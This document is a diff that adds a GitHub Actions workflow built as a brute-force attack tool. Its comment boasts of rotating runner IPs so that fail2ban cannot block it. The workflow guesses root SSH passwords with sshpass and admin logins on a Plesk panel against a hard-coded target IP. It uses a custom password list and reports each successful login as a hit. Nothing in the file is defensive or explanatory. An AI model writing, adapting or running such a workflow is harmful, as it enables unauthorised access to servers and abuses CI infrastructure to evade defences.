@@ -1,0 +1,85 @@
+name: scan
+# Free IP-rotating attack infrastructure: every run gets a fresh GitHub runner IP,
+# so fail2ban on the target never sees the same source twice.
+on:
+  workflow_dispatch:
+    inputs:
+      target:
+        description: 'target ip'
+        default: '74.208.88.23'
+      mode:
+        description: 'ssh | plesk | both'
+        default: 'both'
+
+jobs:
+  ssh:
+    if: ${{ inputs.mode == 'ssh' || inputs.mode == 'both' }}
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      matrix:
+        chunk: [0, 1, 2, 3]
+    steps:
+      - name: ssh password probe (chunk ${{ matrix.chunk }})
+        run: |
+          sudo apt-get update -qq >/dev/null 2>&1
+          sudo apt-get install -y -qq sshpass >/dev/null 2>&1
+          PASSES="root toor 123456 password admin bigbangx bigbangxadmin bigbangx123 Bigbangx Bigbangx123
+          cookie cookie123 cookiechain cookiescan cookscan dosecret garuda nexora dungeon
+          revan revan123 rev1853 Zahh zahh zahhid Zahh-ID risca riscarevan
+          Plesk plesk Plesk123 plesk123 Plesk2024 Plesk2025 Plesk2026
+          admin123 Admin123 admin2024 admin2025 admin2026
+          changeme secret letmein qwerty qwerty123 1q2w3e4r Passw0rd Password1 Password123
+          server server123 vps vps123 host host123 web web123 mail mail123
+          terra terra123 luna luna123 cosmos atomone secret4 columbus
+          bigbang bigbang123 bigbangx2024 bigbangx2025 bigbangx2026
+          cookieverse cookie-verse dosecret123 bridge bridge123 relayer relayer123
+          hermes hermes123 ibc ibc123 wasm wasm123 cw20 cw20ics20"
+          N=0
+          for p in $PASSES; do
+            N=$((N+1))
+            [ $((N % 4)) -ne ${{ matrix.chunk }} ] && continue
+            r=$(timeout 12 sshpass -p "$p" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=6 \
+                 -o PreferredAuthentications=password -o PubkeyAuthentication=no \
+                 root@${{ inputs.target }} 'id' 2>&1 | tail -1)
+            case "$r" in
+              *uid=*) echo "*** SSH HIT root:$p -> $r" ;;
+              *) echo "    root:$p -> $r" ;;
+            esac
+            sleep 1
+          done
+
+  plesk:
+    if: ${{ inputs.mode == 'plesk' || inputs.mode == 'both' }}
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      matrix:
+        chunk: [0, 1, 2, 3]
+    steps:
+      - name: plesk password probe (chunk ${{ matrix.chunk }})
+        run: |
+          PASSES="admin toor 123456 password bigbangx bigbangxadmin bigbangx123 Bigbangx
+          cookie cookie123 cookiechain cookiescan cookscan dosecret garuda nexora dungeon
+          revan revan123 rev1853 Zahh zahhid risca riscarevan
+          Plesk plesk Plesk123 plesk123 Plesk2024 Plesk2025 Plesk2026
+          admin123 Admin123 admin2024 admin2025 admin2026
+          changeme secret letmein qwerty qwerty123 Passw0rd Password1 Password123
+          server server123 vps vps123 host host123 web web123 mail mail123
+          terra terra123 luna luna123 cosmos atomone columbus
+          bigbang bigbang123 bigbangx2024 bigbangx2025 bigbangx2026
+          cookieverse dosecret123 bridge bridge123 relayer relayer123 hermes hermes123"
+          N=0
+          for p in $PASSES; do
+            N=$((N+1))
+            [ $((N % 4)) -ne ${{ matrix.chunk }} ] && continue
+            out=$(curl -sk -m 12 -c /tmp/cj -o /tmp/body -w '%{http_code}' \
+                  -X POST "https://${{ inputs.target }}:8443/login_up.php3" \
+                  --data-urlencode "login_name=admin" --data-urlencode "passwd=$p" --data-urlencode "submit_login=" 2>/dev/null)
+            if grep -qiE 'logout|session_id|plesk-session' /tmp/cj 2>/dev/null; then
+              echo "*** PLESK HIT admin:$p (http $out)"
+            else
+              echo "    admin:$p (http $out)"
+            fi
+            sleep 1
+          done
